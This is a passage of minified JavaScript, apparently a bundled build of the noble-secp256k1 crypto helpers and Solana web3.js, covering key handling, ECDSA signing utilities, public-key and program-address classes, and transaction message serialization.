                        return on(this.toCompactHex())
                    }
                    toCompactHex() {
                        return en(this.r) + en(this.s)
                    }
                }

                function Zt() {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    if (!t.every(Jt)) throw new Error("Uint8Array list expected");
                    if (1 === t.length) return t[0];
                    const r = t.reduce(((e, t) => e + t.length), 0),
                        i = new Uint8Array(r);
                    for (let o = 0, s = 0; o < t.length; o++) {
                        const e = t[o];
                        i.set(e, s), s += e.length
                    }
                    return i
                }

                function Jt(e) {
                    return e instanceof Uint8Array
                }
                const Xt = Array.from({
                    length: 256
                }, ((e, t) => t.toString(16).padStart(2, "0")));

                function $t(e) {
                    if (!(e instanceof Uint8Array)) throw new Error("Expected Uint8Array");
                    let t = "";
                    for (let n = 0; n < e.length; n++) t += Xt[e[n]];
                    return t
                }

                function en(e) {
                    if (e > jt) throw new Error("Expected number < 2^256");
                    return e.toString(16).padStart(64, "0")
                }

                function tn(e) {
                    return on(en(e))
                }

                function nn(e) {
                    const t = e.toString(16);
                    return 1 & t.length ? `0${t}` : t
                }

                function rn(e) {
                    if ("string" !== typeof e) throw new TypeError("hexToNumber: expected string, got " + typeof e);
                    return BigInt(`0x${e}`)
                }

                function on(e) {
                    if ("string" !== typeof e) throw new TypeError("hexToBytes: expected string, got " + typeof e);
                    if (e.length % 2) throw new Error("hexToBytes: received invalid unpadded hex" + e.length);
                    const t = new Uint8Array(e.length / 2);
                    for (let n = 0; n < t.length; n++) {
                        const r = 2 * n,
                            i = e.slice(r, r + 2),
                            o = Number.parseInt(i, 16);
                        if (Number.isNaN(o) || o < 0) throw new Error("Invalid byte sequence");
                        t[n] = o
                    }
                    return t
                }

                function sn(e) {
                    return rn($t(e))
                }

                function an(e) {
                    return e instanceof Uint8Array ? Uint8Array.from(e) : on(e)
                }

                function un(e) {
                    if ("number" === typeof e && Number.isSafeInteger(e) && e > 0) return BigInt(e);
                    if ("bigint" === typeof e && mn(e)) return e;
                    throw new TypeError("Expected valid private scalar: 0 < scalar < curve.n")
                }

                function cn(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Ft.P;
                    const n = e % t;
                    return n >= Nt ? n : t + n
                }

                function ln(e, t) {
                    const {
                        P: n
                    } = Ft;
                    let r = e;
                    for (; t-- > Nt;) r *= r, r %= n;
                    return r
                }

                function fn(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Ft.P;
                    if (e === Nt || t <= Nt) throw new Error(`invert: expected positive integers, got n=${e} mod=${t}`);
                    let n = cn(e, t),
                        r = t,
                        i = Nt,
                        o = Rt,
                        s = Rt,
                        a = Nt;
                    for (; n !== Nt;) {
                        const e = r / n,
                            t = r % n,
                            u = i - s * e,
                            c = o - a * e;
                        r = n, n = t, i = s, o = a, s = u, a = c
                    }
                    const u = r;
                    if (u !== Rt) throw new Error("invert: does not exist");
                    return cn(i, t)
                }
                const hn = (e, t) => (e + t / Dt) / t,
                    dn = Dt ** BigInt(128);

                function pn(e) {
                    const {
                        n: t
                    } = Ft, n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"), r = -Rt * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"), i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"), o = n, s = hn(o * e, t), a = hn(-r * e, t);
                    let u = cn(e - s * n - a * i, t),
                        c = cn(-s * r - a * o, t);
                    const l = u > dn,
                        f = c > dn;
                    if (l && (u = t - u), f && (c = t - c), u > dn || c > dn) throw new Error("splitScalarEndo: Endomorphism failed, k=" + e);
                    return {
                        k1neg: l,
                        k1: u,
                        k2neg: f,
                        k2: c
                    }
                }

                function yn(e) {
                    const {
                        n: t
                    } = Ft, n = 8 * e.length - 256;
                    let r = sn(e);
                    return n > 0 && (r >>= BigInt(n)), r >= t && (r -= t), r
                }
                class gn {
                    constructor() {
                        this.v = new Uint8Array(32).fill(1), this.k = new Uint8Array(32).fill(0), this.counter = 0
                    }
                    hmac() {
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        return Bn.hmacSha256(this.k, ...t)
                    }
                    hmacSync() {
                        if ("function" !== typeof Bn.hmacSha256Sync) throw new Error("utils.hmacSha256Sync is undefined, you need to set it");
                        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        const r = Bn.hmacSha256Sync(this.k, ...t);
                        if (r instanceof Promise) throw new Error("To use sync sign(), ensure utils.hmacSha256 is sync");
                        return r
                    }
                    incr() {
                        if (this.counter >= 1e3) throw new Error("Tried 1,000 k values for sign(), all were invalid");
                        this.counter += 1
                    }
                    async reseed() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : new Uint8Array;
                        this.k = await this.hmac(this.v, Uint8Array.from([0]), e), this.v = await this.hmac(this.v), 0 !== e.length && (this.k = await this.hmac(this.v, Uint8Array.from([1]), e), this.v = await this.hmac(this.v))
                    }
                    reseedSync() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : new Uint8Array;
                        this.k = this.hmacSync(this.v, Uint8Array.from([0]), e), this.v = this.hmacSync(this.v), 0 !== e.length && (this.k = this.hmacSync(this.v, Uint8Array.from([1]), e), this.v = this.hmacSync(this.v))
                    }
                    async generate() {
                        return this.incr(), this.v = await this.hmac(this.v), this.v
                    }
                    generateSync() {
                        return this.incr(), this.v = this.hmacSync(this.v), this.v
                    }
                }

                function mn(e) {
                    return Nt < e && e < Ft.n
                }

                function wn(e) {
                    return Nt < e && e < Ft.P
                }

                function bn(e, t, n) {
                    const r = sn(e);
                    if (!mn(r)) return;
                    const {
                        n: i
                    } = Ft, o = Vt.BASE.multiply(r), s = cn(o.x, i);
                    if (s === Nt) return;
                    const a = cn(fn(r, i) * cn(t + n * s, i), i);
                    if (a === Nt) return;
                    const u = new Yt(s, a);
                    return {
                        sig: u,
                        recovery: (o.x === u.r ? 0 : 2) | Number(o.y & Rt)
                    }
                }

                function vn(e) {
                    let t;
                    if ("bigint" === typeof e) t = e;
                    else if ("number" === typeof e && Number.isSafeInteger(e) && e > 0) t = BigInt(e);
                    else if ("string" === typeof e) {
                        if (64 !== e.length) throw new Error("Expected 32 bytes of private key");
                        t = rn(e)
                    } else {
                        if (!Jt(e)) throw new TypeError("Expected valid private key");
                        if (32 !== e.length) throw new Error("Expected 32 bytes of private key");
                        t = sn(e)
                    }
                    if (!mn(t)) throw new Error("Expected private key: 0 < key < n");
                    return t
                }

                function An(e) {
                    if (e instanceof Yt) return e.assertValidity(), e;
                    try {
                        return Yt.fromDER(e)
                    } catch (t) {
                        return Yt.fromCompact(e)
                    }
                }

                function kn(e) {
                    return sn(e.length > 32 ? e.slice(0, 32) : e)
                }

                function _n(e) {
                    const t = kn(e),
                        n = cn(t, Ft.n);
                    return En(n < Nt ? t : n)
                }

                function En(e) {
                    if ("bigint" !== typeof e) throw new Error("Expected bigint");
                    return on(en(e))
                }

                function Sn(e, t, n) {
                    if (null == e) throw new Error(`sign: expected valid message hash, not "${e}"`);
                    const r = an(e),
                        i = vn(t),
                        o = [En(i), _n(r)];
                    if (null != n) {
                        !0 === n && (n = Bn.randomBytes(32));
                        const e = an(n);
                        if (32 !== e.length) throw new Error("sign: Expected 32 bytes of extra data");
                        o.push(e)
                    }
                    return {
                        seed: Zt(...o),
                        m: kn(r),
                        d: i
                    }
                }

                function In(e, t) {
                    let {
                        sig: n,
                        recovery: r
                    } = e;
                    const {
                        canonical: i,
                        der: o,
                        recovered: s
                    } = Object.assign({
                        canonical: !0,
                        der: !0
                    }, t);
                    i && n.hasHighS() && (n = n.normalizeS(), r ^= 1);
                    const a = o ? n.toDERRawBytes() : n.toCompactRawBytes();
                    return s ? [a, r] : a
                }
                Vt.BASE._setWindowSize(8);
                const xn = {
                        node: Lt,
                        web: "object" === typeof self && "crypto" in self ? self.crypto : void 0
                    },
                    Mn = {},
                    Bn = {
                        isValidPrivateKey(e) {
                            try {
                                return vn(e), !0
                            } catch (t) {
                                return !1
                            }
                        },
                        privateAdd: (e, t) => tn(cn(vn(e) + vn(t), Ft.n)),
                        privateNegate: e => {
                            const t = vn(e);
                            return tn(Ft.n - t)
                        },
                        pointAddScalar: (e, t, n) => {
                            const r = Vt.fromHex(e),
                                i = vn(t),
                                o = Vt.BASE.multiplyAndAddUnsafe(r, i, Rt);
                            if (!o) throw new Error("Tweaked point at infinity");
                            return o.toRawBytes(n)
                        },
                        pointMultiply: (e, t, n) => {
                            const r = Vt.fromHex(e),
                                i = sn(an(t));
                            return r.multiply(i).toRawBytes(n)
                        },
                        hashToPrivateKey: e => {
                            if ((e = an(e)).length < 40 || e.length > 1024) throw new Error("Expected 40-1024 bytes of private key as per FIPS 186");
                            return tn(cn(sn(e), Ft.n - Rt) + Rt)
                        },
                        randomBytes: function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
                            if (xn.web) return xn.web.getRandomValues(new Uint8Array(e));
                            if (xn.node) {
                                const {
                                    randomBytes: t
                                } = xn.node;
                                return Uint8Array.from(t(e))
                            }
                            throw new Error("The environment doesn't have randomBytes function")
                        },
                        randomPrivateKey: () => Bn.hashToPrivateKey(Bn.randomBytes(40)),
                        bytesToHex: $t,
                        hexToBytes: on,
                        concatBytes: Zt,
                        mod: cn,
                        invert: fn,
                        sha256: async function() {
                            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                            if (xn.web) {
                                const e = await xn.web.subtle.digest("SHA-256", Zt(...t));
                                return new Uint8Array(e)
                            }
                            if (xn.node) {
                                const {
                                    createHash: e
                                } = xn.node, n = e("sha256");
                                return t.forEach((e => n.update(e))), Uint8Array.from(n.digest())
                            }
                            throw new Error("The environment doesn't have sha256 function")
                        },
                        hmacSha256: async function(e) {
                            for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
                            if (xn.web) {
                                const t = await xn.web.subtle.importKey("raw", e, {
                                        name: "HMAC",
                                        hash: {
                                            name: "SHA-256"
                                        }
                                    }, !1, ["sign"]),
                                    r = Zt(...n),
                                    i = await xn.web.subtle.sign("HMAC", t, r);
                                return new Uint8Array(i)
                            }
                            if (xn.node) {
                                const {
                                    createHmac: t
                                } = xn.node, r = t("sha256", e);
                                return n.forEach((e => r.update(e))), Uint8Array.from(r.digest())
                            }
                            throw new Error("The environment doesn't have hmac-sha256 function")
                        },
                        sha256Sync: void 0,
                        hmacSha256Sync: void 0,
                        taggedHash: async function(e) {
                            let t = Mn[e];
                            if (void 0 === t) {
                                const n = await Bn.sha256(Uint8Array.from(e, (e => e.charCodeAt(0))));
                                t = Zt(n, n), Mn[e] = t
                            }
                            for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                            return Bn.sha256(t, ...r)
                        },
                        taggedHashSync: function(e) {
                            if ("function" !== typeof Bn.sha256Sync) throw new Error("utils.sha256Sync is undefined, you need to set it");
                            let t = Mn[e];
                            if (void 0 === t) {
                                const n = Bn.sha256Sync(Uint8Array.from(e, (e => e.charCodeAt(0))));
                                t = Zt(n, n), Mn[e] = t
                            }
                            for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                            return Bn.sha256Sync(t, ...r)
                        },
                        precompute() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8,
                                t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Vt.BASE;
                            const n = t === Vt.BASE ? t : new Vt(t.x, t.y);
                            return n._setWindowSize(e), n.multiply(zt), n
                        }
                    };
                _e.sha512Sync = function() {
                    return S(_e.concatBytes(...arguments))
                };
                const Tn = _e.randomPrivateKey,
                    On = () => {
                        const e = _e.randomPrivateKey(),
                            t = Cn(e),
                            n = new Uint8Array(64);
                        return n.set(e), n.set(t, 32), {
                            publicKey: t,
                            secretKey: n
                        }
                    },
                    Cn = Ae.getPublicKey;

                function Pn(e) {
                    try {
                        return V.fromHex(e, !0), !0
                    } catch {
                        return !1
                    }
                }
                const Ln = (e, t) => Ae.sign(e, t.slice(0, 32)),
                    Nn = Ae.verify,
                    Rn = e => r.lW.isBuffer(e) ? e : e instanceof Uint8Array ? r.lW.from(e.buffer, e.byteOffset, e.byteLength) : r.lW.from(e);
                class Dn {
                    constructor(e) {
                        Object.assign(this, e)
                    }
                    encode() {
                        return r.lW.from((0, Le.serialize)(Un, this))
                    }
                    static decode(e) {
                        return (0, Le.deserialize)(Un, this, e)
                    }
                    static decodeUnchecked(e) {
                        return (0, Le.deserializeUnchecked)(Un, this, e)
                    }
                }
                class zn extends Dn {
                    constructor(e) {
                        if (super(e), this.enum = "", 1 !== Object.keys(e).length) throw new Error("Enum can only take single value");
                        Object.keys(e).map((e => {
                            this.enum = e
                        }))
                    }
                }
                const Un = new Map,
                    jn = 32,
                    Fn = 32;
                let Hn = 1;
                class Wn extends Dn {
                    constructor(e) {
                        if (super({}), this._bn = void 0, function(e) {
                                return void 0 !== e._bn
                            }(e)) this._bn = e._bn;
                        else {
                            if ("string" === typeof e) {
                                const t = xe().decode(e);
                                if (t.length != Fn) throw new Error("Invalid public key input");
                                this._bn = new(Se())(t)
                            } else this._bn = new(Se())(e);
                            if (this._bn.byteLength() > 32) throw new Error("Invalid public key input")
                        }
                    }
                    static unique() {
                        const e = new Wn(Hn);
                        return Hn += 1, new Wn(e.toBuffer())
                    }
                    equals(e) {
                        return this._bn.eq(e._bn)
                    }
                    toBase58() {
                        return xe().encode(this.toBytes())
                    }
                    toJSON() {
                        return this.toBase58()
                    }
                    toBytes() {
                        return this.toBuffer()
                    }
                    toBuffer() {
                        const e = this._bn.toArrayLike(r.lW);
                        if (e.length === Fn) return e;
                        const t = r.lW.alloc(32);
                        return e.copy(t, 32 - e.length), t
                    }
                    toString() {
                        return this.toBase58()
                    }
                    static async createWithSeed(e, t, n) {
                        const i = r.lW.concat([e.toBuffer(), r.lW.from(t), n.toBuffer()]),
                            o = Pe(i);
                        return new Wn(o)
                    }
                    static createProgramAddressSync(e, t) {
                        let n = r.lW.alloc(0);
                        e.forEach((function(e) {
                            if (e.length > jn) throw new TypeError("Max seed length exceeded");
                            n = r.lW.concat([n, Rn(e)])
                        })), n = r.lW.concat([n, t.toBuffer(), r.lW.from("ProgramDerivedAddress")]);
                        const i = Pe(n);
                        if (Pn(i)) throw new Error("Invalid seeds, address must fall off the curve");
                        return new Wn(i)
                    }
                    static async createProgramAddress(e, t) {
                        return this.createProgramAddressSync(e, t)
                    }
                    static findProgramAddressSync(e, t) {
                        let n, i = 255;
                        for (; 0 != i;) {
                            try {
                                const o = e.concat(r.lW.from([i]));
                                n = this.createProgramAddressSync(o, t)
                            } catch (o) {
                                if (o instanceof TypeError) throw o;
                                i--;
                                continue
                            }
                            return [n, i]
                        }
                        throw new Error("Unable to find a viable program address nonce")
                    }
                    static async findProgramAddress(e, t) {
                        return this.findProgramAddressSync(e, t)
                    }
                    static isOnCurve(e) {
                        return Pn(new Wn(e).toBytes())
                    }
                }
                Wn.default = new Wn("11111111111111111111111111111111"), Un.set(Wn, {
                    kind: "struct",
                    fields: [
                        ["_bn", "u256"]
                    ]
                });
                class Kn {
                    constructor(e) {
                        if (this._publicKey = void 0, this._secretKey = void 0, e) {
                            const t = Rn(e);
                            if (64 !== e.length) throw new Error("bad secret key size");
                            this._publicKey = t.slice(32, 64), this._secretKey = t.slice(0, 32)
                        } else this._secretKey = Rn(Tn()), this._publicKey = Rn(Cn(this._secretKey))
                    }
                    get publicKey() {
                        return new Wn(this._publicKey)
                    }
                    get secretKey() {
                        return r.lW.concat([this._secretKey, this._publicKey], 64)
                    }
                }
                const qn = new Wn("BPFLoader1111111111111111111111111111111111"),
                    Vn = 1232,
                    Qn = 127,
                    Gn = 64;
                class Yn extends Error {
                    constructor(e) {
                        super(`Signature ${e} has expired: block height exceeded.`), this.signature = void 0, this.signature = e
                    }
                }
                Object.defineProperty(Yn.prototype, "name", {
                    value: "TransactionExpiredBlockheightExceededError"
                });
                class Zn extends Error {
                    constructor(e, t) {
                        super(`Transaction was not confirmed in ${t.toFixed(2)} seconds. It is unknown if it succeeded or failed. Check signature ${e} using the Solana Explorer or CLI tools.`), this.signature = void 0, this.signature = e
                    }
                }
                Object.defineProperty(Zn.prototype, "name", {
                    value: "TransactionExpiredTimeoutError"
                });
                class Jn {
                    constructor(e, t) {
                        this.staticAccountKeys = void 0, this.accountKeysFromLookups = void 0, this.staticAccountKeys = e, this.accountKeysFromLookups = t
                    }
                    keySegments() {
                        const e = [this.staticAccountKeys];
                        return this.accountKeysFromLookups && (e.push(this.accountKeysFromLookups.writable), e.push(this.accountKeysFromLookups.readonly)), e
                    }
                    get(e) {
                        for (const t of this.keySegments()) {
                            if (e < t.length) return t[e];
                            e -= t.length
                        }
                    }
                    get length() {
                        return this.keySegments().flat().length
                    }
                    compileInstructions(e) {
                        if (this.length > 256) throw new Error("Account index overflow encountered during compilation");
                        const t = new Map;
                        this.keySegments().flat().forEach(((e, n) => {
                            t.set(e.toBase58(), n)
                        }));
                        const n = e => {
                            const n = t.get(e.toBase58());
                            if (void 0 === n) throw new Error("Encountered an unknown instruction account key during compilation");
                            return n
                        };
                        return e.map((e => ({
                            programIdIndex: n(e.programId),
                            accountKeyIndexes: e.keys.map((e => n(e.pubkey))),
                            data: e.data
                        })))
                    }
                }
                const Xn = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "publicKey";
                        return Ne.Ik(32, e)
                    },
                    $n = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "signature";
                        return Ne.Ik(64, e)
                    },
                    er = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "string";
                        const t = Ne.n_([Ne.Jq("length"), Ne.Jq("lengthPadding"), Ne.Ik(Ne.cv(Ne.Jq(), -8), "chars")], e),
                            n = t.decode.bind(t),
                            i = t.encode.bind(t),
                            o = t;
                        return o.decode = (e, t) => n(e, t).chars.toString(), o.encode = (e, t, n) => {
                            const o = {
                                chars: r.lW.from(e, "utf8")
                            };
                            return i(o, t, n)
                        }, o.alloc = e => Ne.Jq().span + Ne.Jq().span + r.lW.from(e, "utf8").length, o
                    };

                function tr(e, t) {
                    const n = e => {
                        if (e.span >= 0) return e.span;
                        if ("function" === typeof e.alloc) return e.alloc(t[e.property]);
                        if ("count" in e && "elementLayout" in e) {
                            const r = t[e.property];
                            if (Array.isArray(r)) return r.length * n(e.elementLayout)
                        } else if ("fields" in e) return tr({
                            layout: e
                        }, t[e.property]);
                        return 0
                    };
                    let r = 0;
                    return e.layout.fields.forEach((e => {
                        r += n(e)
                    })), r
                }

                function nr(e) {
                    let t = 0,
                        n = 0;
                    for (;;) {
                        let r = e.shift();
                        if (t |= (127 & r) << 7 * n, n += 1, 0 === (128 & r)) break
                    }
                    return t
                }

                function rr(e, t) {
                    let n = t;
                    for (;;) {
                        let t = 127 & n;
                        if (n >>= 7, 0 == n) {
                            e.push(t);
                            break
                        }
                        t |= 128, e.push(t)
                    }
                }

                function ir(e, t) {
                    if (!e) throw new Error(t || "Assertion failed")
                }
                class or {
                    constructor(e, t) {
                        this.payer = void 0, this.keyMetaMap = void 0, this.payer = e, this.keyMetaMap = t
                    }
                    static compile(e, t) {
                        const n = new Map,
                            r = e => {
                                const t = e.toBase58();
                                let r = n.get(t);
                                return void 0 === r && (r = {
                                    isSigner: !1,
                                    isWritable: !1,
                                    isInvoked: !1
                                }, n.set(t, r)), r
                            },
                            i = r(t);
                        i.isSigner = !0, i.isWritable = !0;
                        for (const o of e) {
                            r(o.programId).isInvoked = !0;
                            for (const e of o.keys) {
                                const t = r(e.pubkey);
                                t.isSigner || (t.isSigner = e.isSigner), t.isWritable || (t.isWritable = e.isWritable)
                            }
                        }
                        return new or(t, n)
                    }
                    getMessageComponents() {
                        const e = [...this.keyMetaMap.entries()];
                        ir(e.length <= 256, "Max static account keys length exceeded");
                        const t = e.filter((e => {
                                let [, t] = e;
                                return t.isSigner && t.isWritable
                            })),
                            n = e.filter((e => {
                                let [, t] = e;
                                return t.isSigner && !t.isWritable
                            })),
                            r = e.filter((e => {
                                let [, t] = e;
                                return !t.isSigner && t.isWritable
                            })),
                            i = e.filter((e => {
                                let [, t] = e;
                                return !t.isSigner && !t.isWritable
                            })),
                            o = {
                                numRequiredSignatures: t.length + n.length,
                                numReadonlySignedAccounts: n.length,
                                numReadonlyUnsignedAccounts: i.length
                            }; {
                            ir(t.length > 0, "Expected at least one writable signer key");
                            const [e] = t[0];
                            ir(e === this.payer.toBase58(), "Expected first writable signer key to be the fee payer")
                        }
                        return [o, [...t.map((e => {
                            let [t] = e;
                            return new Wn(t)
                        })), ...n.map((e => {
                            let [t] = e;
                            return new Wn(t)
                        })), ...r.map((e => {
                            let [t] = e;
                            return new Wn(t)
                        })), ...i.map((e => {
                            let [t] = e;
                            return new Wn(t)
                        }))]]
                    }
                    extractTableLookup(e) {
                        const [t, n] = this.drainKeysFoundInLookupTable(e.state.addresses, (e => !e.isSigner && !e.isInvoked && e.isWritable)), [r, i] = this.drainKeysFoundInLookupTable(e.state.addresses, (e => !e.isSigner && !e.isInvoked && !e.isWritable));
                        if (0 !== t.length || 0 !== r.length) return [{
                            accountKey: e.key,
                            writableIndexes: t,
                            readonlyIndexes: r
                        }, {
                            writable: n,
                            readonly: i
                        }]
                    }
                    drainKeysFoundInLookupTable(e, t) {
                        const n = new Array,
                            r = new Array;
                        for (const [i, o] of this.keyMetaMap.entries())
                            if (t(o)) {
                                const t = new Wn(i),
                                    o = e.findIndex((e => e.equals(t)));
                                o >= 0 && (ir(o < 256, "Max lookup table index exceeded"), n.push(o), r.push(t), this.keyMetaMap.delete(i))
                            }
                        return [n, r]
                    }
                }
                class sr {
                    constructor(e) {
                        this.header = void 0, this.accountKeys = void 0, this.recentBlockhash = void 0, this.instructions = void 0, this.indexToProgramIds = new Map, this.header = e.header, this.accountKeys = e.accountKeys.map((e => new Wn(e))), this.recentBlockhash = e.recentBlockhash, this.instructions = e.instructions, this.instructions.forEach((e => this.indexToProgramIds.set(e.programIdIndex, this.accountKeys[e.programIdIndex])))
                    }
                    get version() {
                        return "legacy"
                    }
                    get staticAccountKeys() {
                        return this.accountKeys
                    }
                    get compiledInstructions() {
                        return this.instructions.map((e => ({
                            programIdIndex: e.programIdIndex,
                            accountKeyIndexes: e.accounts,
                            data: xe().decode(e.data)
                        })))
                    }
                    get addressTableLookups() {
                        return []
                    }
                    getAccountKeys() {
                        return new Jn(this.staticAccountKeys)
                    }
                    static compile(e) {
                        const t = or.compile(e.instructions, e.payerKey),
                            [n, r] = t.getMessageComponents(),
                            i = new Jn(r).compileInstructions(e.instructions).map((e => ({
                                programIdIndex: e.programIdIndex,
                                accounts: e.accountKeyIndexes,
                                data: xe().encode(e.data)
                            })));
                        return new sr({
                            header: n,
                            accountKeys: r,
                            recentBlockhash: e.recentBlockhash,
                            instructions: i
                        })
                    }
                    isAccountSigner(e) {
                        return e < this.header.numRequiredSignatures
                    }
                    isAccountWritable(e) {
                        const t = this.header.numRequiredSignatures;
                        if (e >= this.header.numRequiredSignatures) {
                            return e - t < this.accountKeys.length - t - this.header.numReadonlyUnsignedAccounts
                        }
                        return e < t - this.header.numReadonlySignedAccounts
                    }
                    isProgramId(e) {
                        return this.indexToProgramIds.has(e)
                    }
                    programIds() {
                        return [...this.indexToProgramIds.values()]
                    }
                    nonProgramIds() {
                        return this.accountKeys.filter(((e, t) => !this.isProgramId(t)))
                    }
                    serialize() {
                        const e = this.accountKeys.length;
                        let t = [];
                        rr(t, e);
                        const n = this.instructions.map((e => {
                            const {
                                accounts: t,
                                programIdIndex: n
                            } = e, i = Array.from(xe().decode(e.data));
                            let o = [];
                            rr(o, t.length);
                            let s = [];
                            return rr(s, i.length), {
                                programIdIndex: n,
                                keyIndicesCount: r.lW.from(o),
                                keyIndices: t,
                                dataLength: r.lW.from(s),
                                data: i
                            }
                        }));
                        let i = [];
                        rr(i, n.length);
                        let o = r.lW.alloc(Vn);
                        r.lW.from(i).copy(o);
                        let s = i.length;
                        n.forEach((e => {
                            const t = Ne.n_([Ne.u8("programIdIndex"), Ne.Ik(e.keyIndicesCount.length, "keyIndicesCount"), Ne.A9(Ne.u8("keyIndex"), e.keyIndices.length, "keyIndices"), Ne.Ik(e.dataLength.length, "dataLength"), Ne.A9(Ne.u8("userdatum"), e.data.length, "data")]).encode(e, o, s);
                            s += t
                        })), o = o.slice(0, s);
                        const a = Ne.n_([Ne.Ik(1, "numRequiredSignatures"), Ne.Ik(1, "numReadonlySignedAccounts"), Ne.Ik(1, "numReadonlyUnsignedAccounts"), Ne.Ik(t.length, "keyCount"), Ne.A9(Xn("key"), e, "keys"), Xn("recentBlockhash")]),
                            u = {
                                numRequiredSignatures: r.lW.from([this.header.numRequiredSignatures]),
                                numReadonlySignedAccounts: r.lW.from([this.header.numReadonlySignedAccounts]),
                                numReadonlyUnsignedAccounts: r.lW.from([this.header.numReadonlyUnsignedAccounts]),
                                keyCount: r.lW.from(t),
                                keys: this.accountKeys.map((e => Rn(e.toBytes()))),
                                recentBlockhash: xe().decode(this.recentBlockhash)
                            };
                        let c = r.lW.alloc(2048);
                        const l = a.encode(u, c);
                        return o.copy(c, l), c.slice(0, l + o.length)
                    }
                    static from(e) {
                        let t = [...e];
                        const n = t.shift();
                        if (n !== (n & Qn)) throw new Error("Versioned messages must be deserialized with VersionedMessage.deserialize()");
                        const i = t.shift(),
                            o = t.shift(),
                            s = nr(t);
                        let a = [];
                        for (let h = 0; h < s; h++) {
                            const e = t.slice(0, Fn);
                            t = t.slice(Fn), a.push(new Wn(r.lW.from(e)))
                        }
                        const u = t.slice(0, Fn);
                        t = t.slice(Fn);
                        const c = nr(t);
                        let l = [];
                        for (let h = 0; h < c; h++) {
                            const e = t.shift(),
                                n = nr(t),
                                i = t.slice(0, n);
                            t = t.slice(n);
                            const o = nr(t),
                                s = t.slice(0, o),
                                a = xe().encode(r.lW.from(s));
                            t = t.slice(o), l.push({
                                programIdIndex: e,
                                accounts: i,
                                data: a
                            })
                        }
                        const f = {
                            header: {
                                numRequiredSignatures: n,
                                numReadonlySignedAccounts: i,
                                numReadonlyUnsignedAccounts: o
                            },
                            recentBlockhash: xe().encode(r.lW.from(u)),
                            accountKeys: a,
                            instructions: l
                        };
                        return new sr(f)
                    }
                }
                class ar {
                    constructor(e) {
                        this.header = void 0, this.staticAccountKeys = void 0, this.recentBlockhash = void 0, this.compiledInstructions = void 0, this.addressTableLookups = void 0, this.header = e.header, this.staticAccountKeys = e.staticAccountKeys, this.recentBlockhash = e.recentBlockhash, this.compiledInstructions = e.compiledInstructions, this.addressTableLookups = e.addressTableLookups
                    }
                    get version() {
                        return 0
                    }
                    get numAccountKeysFromLookups() {
                        let e = 0;
                        for (const t of this.addressTableLookups) e += t.readonlyIndexes.length + t.writableIndexes.length;
                        return e
                    }
                    getAccountKeys(e) {
                        let t;
                        if (e && "accountKeysFromLookups" in e && e.accountKeysFromLookups) {
                            if (this.numAccountKeysFromLookups != e.accountKeysFromLookups.writable.length + e.accountKeysFromLookups.readonly.length) throw new Error("Failed to get account keys because of a mismatch in the number of account keys from lookups");
                            t = e.accountKeysFromLookups
                        } else if (e && "addressLookupTableAccounts" in e && e.addressLookupTableAccounts) t = this.resolveAddressTableLookups(e.addressLookupTableAccounts);
                        else if (this.addressTableLookups.length > 0) throw new Error("Failed to get account keys because address table lookups were not resolved");
                        return new Jn(this.staticAccountKeys, t)
                    }
                    isAccountSigner(e) {
                        return e < this.header.numRequiredSignatures
                    }
                    isAccountWritable(e) {
                        const t = this.header.numRequiredSignatures,
                            n = this.staticAccountKeys.length;
                        if (e >= n) {
                            return e - n < this.addressTableLookups.reduce(((e, t) => e + t.writableIndexes.length), 0)
                        }
                        if (e >= this.header.numRequiredSignatures) {
                            return e - t < n - t - this.header.numReadonlyUnsignedAccounts
                        }
                        return e < t - this.header.numReadonlySignedAccounts
                    }
                    resolveAddressTableLookups(e) {
                        const t = {
                            writable: [],
                            readonly: []
                        };
                        for (const n of this.addressTableLookups) {
                            const r = e.find((e => e.key.equals(n.accountKey)));
                            if (!r) throw new Error(`Failed to find address lookup table account for table key ${n.accountKey.toBase58()}`);
                            for (const e of n.writableIndexes) {
                                if (!(e < r.state.addresses.length)) throw new Error(`Failed to find address for index ${e} in address lookup table ${n.accountKey.toBase58()}`);
                                t.writable.push(r.state.addresses[e])
                            }
                            for (const e of n.readonlyIndexes) {
                                if (!(e < r.state.addresses.length)) throw new Error(`Failed to find address for index ${e} in address lookup table ${n.accountKey.toBase58()}`);
                                t.readonly.push(r.state.addresses[e])
                            }
                        }
                        return t
                    }
                    static compile(e) {
                        const t = or.compile(e.instructions, e.payerKey),
                            n = new Array,
                            r = {
                                writable: new Array,
                                readonly: new Array
                            },
                            i = e.addressLookupTableAccounts || [];
                        for (const u of i) {
                            const e = t.extractTableLookup(u);
                            if (void 0 !== e) {
                                const [t, {
                                    writable: i,
                                    readonly: o
                                }] = e;
                                n.push(t), r.writable.push(...i), r.readonly.push(...o)
                            }
                        }
                        const [o, s] = t.getMessageComponents(), a = new Jn(s, r).compileInstructions(e.instructions);
                        return new ar({
                            header: o,
                            staticAccountKeys: s,
                            recentBlockhash: e.recentBlockhash,
                            compiledInstructions: a,
                            addressTableLookups: n
                        })
                    }
                    serialize() {
                        const e = Array();
                        rr(e, this.staticAccountKeys.length);
                        const t = this.serializeInstructions(),
                            n = Array();
                        rr(n, this.compiledInstructions.length);
